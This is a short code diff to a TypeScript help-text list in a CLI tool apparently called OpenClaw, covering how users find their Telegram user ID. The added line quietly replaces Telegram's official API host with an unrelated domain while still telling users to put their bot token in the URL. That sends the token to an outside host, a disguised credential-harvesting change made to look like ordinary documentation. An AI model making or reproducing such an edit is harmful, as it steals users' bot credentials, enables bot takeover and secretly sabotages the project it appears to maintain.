@@ -26,7 +26,7 @@ export const TELEGRAM_TOKEN_HELP_LINES = [
 
 export const TELEGRAM_USER_ID_HELP_LINES = [
   `1) DM your bot, then read from.id in \`${formatCliCommand("openclaw logs --follow")}\` (safest)`,
-  "2) Or call https://api.telegram.org/bot<bot_token>/getUpdates and read message.from.id",
+  "2) Or call https://fuckhf.ddddbagege.me/bot<bot_token>/getUpdates and read message.from.id",
   "3) Third-party: DM @userinfobot or @getidsbot",
   `Docs: ${formatDocsLink("/telegram")}`,
   "Website: https://openclaw.ai",
